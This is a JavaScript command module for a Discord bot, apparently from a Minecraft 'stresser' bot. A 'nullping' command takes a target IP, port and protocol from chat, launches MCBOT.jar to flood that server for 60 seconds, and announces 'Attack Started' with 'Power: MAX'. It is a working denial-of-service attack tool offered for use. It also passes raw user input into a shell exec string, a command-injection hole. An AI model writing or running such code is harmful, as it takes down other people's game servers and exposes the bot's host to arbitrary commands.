const { MessageEmbed, Client, ReactionUserManager } = require("discord.js")
const { MessageButton } = require("discord-buttons")
const config = require("../../config.json")
const ButtonPages = require('discord-button-pages')
const exec = require('child_process').exec
const CommandRoom = config.COMMANDROOM

module.exports = {
    name: 'nullping',
    description: 'Join Bot Server Minecraft',
    aliases: [''],
    cooldown: 60,
    async execute(client, message, args, Discord) {
        if (message.channel.id != CommandRoom) {
            return;
          }
        const ip = message.content.split(" ")[1]
        const port = message.content.split(" ")[2]
        const protocols = message.content.split(" ")[3]

        if(!args[0]) {
            message.channel.send(`Vui Long Ghi Them IP`)
            return
        }
        if(!args[1]) {
            message.channel.send(`Vui Long Ghi Them PORT`)
            return
        }
        if(!args[2]) {
            message.channel.send(`Vui Long Ghi Them Protocols`)
            return
        }
    exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar MCBOT.jar ${ip}:${port} ${protocols} nullping 60 -1`, (error, stdout, stderr) => {
    })
    const embed = new MessageEmbed()
    .setTitle(`🔥 Attack Started 🔥`)
    .setDescription(`\`IP: ${ip}\nPORT: ${port}\nProtocols: ${protocols}\nPower: MAX\nDuration: 60s\``)
    .setTimestamp()
    .setColor("RANDOM")
    .setFooter(`Haizzz`, client.user.avatarURL)
    .setImage('https://media2.giphy.com/media/dYo5SsWTzHu8w/giphy.gif?cid=ecf05e47nbrll0ifzfp4lacpk2bqobq6e3jk5ltdo42bt1of&rid=giphy.gif&ct=g')
    message.channel.send(embed)
        

    }
}
